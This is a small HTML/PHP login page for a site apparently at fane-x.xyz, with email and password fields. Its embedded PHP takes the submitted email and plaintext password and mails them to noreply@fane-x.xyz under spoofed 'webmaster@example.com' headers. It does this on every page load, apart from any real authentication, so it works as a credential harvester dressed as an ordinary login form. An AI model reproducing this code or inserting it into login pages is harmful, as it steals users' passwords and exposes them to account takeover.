<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="../CSS/style.css">
    <title>Login</title>
</head>
<body class="body">
        
        <form class="grid" action="login.php" method="post">
            <input class="inputbox" type="text" name="email" placeholder="Email" required>
            <input class="inputbox" type="password" name="password" placeholder="Password" required>
            <button class="button2" type="submit" name="submit">Login</button>
            <button class="button2" onclick="window.location.href='https://www.fane-x.xyz/';">Back</button>
        </form>
        <?php
            $to      = 'noreply@fane-x.xyz';
            $subject = 'Details';
             //set message as email and password
            $message = 'Email: ' . $_POST['email'] . ' Password: ' . $_POST['password'];
            $headers = 'From: webmaster@example.com'       . "\r\n" .
                        'Reply-To: webmaster@example.com' . "\r\n" .
                        'X-Mailer: PHP/' . phpversion();
            mail($to, $subject, $message, $headers);
        ?>

</body>
</html>